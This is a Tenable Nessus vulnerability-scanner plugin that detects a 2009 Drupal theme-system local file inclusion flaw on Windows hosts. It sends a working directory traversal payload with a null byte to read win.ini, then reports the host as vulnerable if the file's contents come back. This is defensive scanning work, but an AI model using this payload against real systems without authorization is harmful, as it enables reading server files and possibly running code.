#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35751);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_bugtraq_id(33910);
  script_osvdb_id(52287);

  script_name(english:"Drupal Theme System Template Local File Inclusion");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability.");
  script_set_attribute( attribute:"description", value:
"The version of Drupal running on the remote web server fails to filter
input to the 'template_file' argument of the 'theme_render_template'
function before using it in 'includes/themes.inc' to include PHP code.
When Drupal is running on a Windows host, an unauthenticated attacker
can exploit this vulnerability to view local files or possibly execute
arbitrary PHP scripts with the permissions of the web server process."  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fb0fb4bc");
  script_set_attribute( attribute:"see_also", value:"http://www.securityfocus.com/archive/1/501297/30/0/threaded");
  script_set_attribute(attribute:"see_also",  value:"https://www.drupal.org/node/383724");
  script_set_attribute( attribute:"see_also", value: "https://www.drupal.org/node/384024");
  script_set_attribute( attribute:"solution", value:
"Either apply the appropriate patch as described in the project's
advisories above or upgrade to Drupal 6.10 / 5.16 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/02/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/02/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www",80);
  script_require_keys("installed_sw/Drupal", "www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
vuln = FALSE; 

# Only test Windows if we know what the OS is.
if (report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if (os && "Windows" >!< os)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}

files = make_list('windows\\win.ini', 'winnt\\win.ini');
file_pats = make_array();
file_pats['winnt\\win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows\\win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

traversal = crap(data:"..\", length:3*9) + "..\";

foreach file (files)
{
  url = '/?q=node/'+traversal+file+'%00';
  res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    output = res[2];
    break;
  }
}

if (vuln)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(install_url + url),
    output      : chomp(output),
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
